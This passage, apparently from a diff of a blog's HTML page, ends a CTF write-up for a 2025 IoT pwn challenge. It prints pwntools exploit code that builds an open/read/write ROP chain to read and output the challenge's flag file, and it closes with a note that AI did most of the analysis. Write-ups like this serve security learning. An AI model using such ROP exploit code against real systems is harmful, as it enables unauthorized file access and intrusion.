class="string">&quot;ret&quot;</span>]))</span><br><span class="line">pop_rsi_r15_ret = text_base + <span class="built_in">next</span>(gb.search_gadget([<span class="string">&quot;pop rsi&quot;</span>, <span class="string">&quot;pop r15&quot;</span>, <span class="string">&quot;ret&quot;</span>]))</span><br><span class="line">add_edx_edi_ret = text_base + <span class="number">0x2a94</span>  <span class="comment"># 0x0000000000002a94: add edx, edi; nop; ret;</span></span><br><span class="line">add_rsp_0xc0_ret = text_base + <span class="number">0x2a84</span>  <span class="comment"># 0x0000000000002a84: add rsp, 0xc0; ret;</span></span><br><span class="line">open_addr = text_base + binary.plt[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = text_base + binary.plt[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = text_base + binary.plt[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; open/read/write rop &quot;&quot;&quot;</span></span><br><span class="line">path_flag = text_base + <span class="number">0xc000</span> + <span class="number">0x10</span></span><br><span class="line">path_log = path_flag + <span class="number">15</span></span><br><span class="line">buf = text_base + <span class="number">0xc000</span> + <span class="number">0x100</span>  <span class="comment"># read buf</span></span><br><span class="line">size = <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;/home/ctf/flag\x00&quot;</span></span><br><span class="line">payload += <span class="string">b&quot;/home/ctf/client.log\x00&quot;</span></span><br><span class="line">payload = payload.ljust(<span class="number">64</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">payload += p64(add_rsp_0xc0_ret)</span><br><span class="line"><span class="comment"># int fs = open(path, O_RDONLY, NULL)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(path_flag)  <span class="comment"># rdi = &quot;/path/to/flag&quot;</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)  <span class="comment"># rsi = 0 == O_RDONLY</span></span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"><span class="comment"># int fs = open(path, O_RWONLY, NULL)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(path_log)  <span class="comment"># rdi = &quot;/path/to/flag&quot;</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(<span class="number">1</span>) + p64(<span class="number">0</span>)  <span class="comment"># rsi = 0 == O_RDONLY</span></span><br><span class="line">payload += p64(open_addr)</span><br><span class="line"><span class="comment"># read(fs, buf, size)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0x100</span>) + p64(add_edx_edi_ret)  <span class="comment"># edx = 0x100</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">5</span>)  <span class="comment"># rdi = fs</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(buf) + p64(<span class="number">0</span>)  <span class="comment"># rsi = buf</span></span><br><span class="line">payload += p64(read_addr)</span><br><span class="line"><span class="comment"># write(1, buf, size)</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">6</span>)  <span class="comment"># rdi = fs</span></span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(buf) + p64(<span class="number">0</span>)  <span class="comment"># rsi = buf</span></span><br><span class="line">payload += p64(write_addr)</span><br><span class="line">data = p8(<span class="number">0x41</span>) + p32(<span class="built_in">len</span>(payload)) + payload</span><br><span class="line">run(<span class="string">f&quot;exechex <span class="subst">&#123;idx&#125;</span> 2 <span class="subst">&#123;binascii.hexlify(data).decode()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/11/02/2025-qwnt-quals-iot2-wp/../2025-qwnt-quals-iot2-wp/d9edc69b6c9a9614510a1f0f26be852e.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>整个复现过程，基本上只有 rop 是自己写的，绝大部分的分析过程都是 AI 做的，人工主要是测功能和指导 AI 的分析方向。目前 AI 针对一些比较小的程序，分析效果还是不错的。</p>
 
         </div>
 
@@ -269,7 +586,7 @@
                 <a class="prev" rel="prev" href="../pwntools-libcdb/">libcdb：pwntools中的LibcSearcher替代功能</a>
             
             
-            <a class="next" rel="next" href="../../../10/29/2025-qwnt-quals-wp/">第八届“强网”拟态防御国际精英挑战赛 初赛 Write Up</a>
+            <a class="next" rel="next" href="../../../10/29/2025-qwnt-quals-iot1-wp/">第八届“强网”拟态防御国际精英挑战赛 初赛 Write Up：WIN！致敬 mt</a>
             
         </section>
 
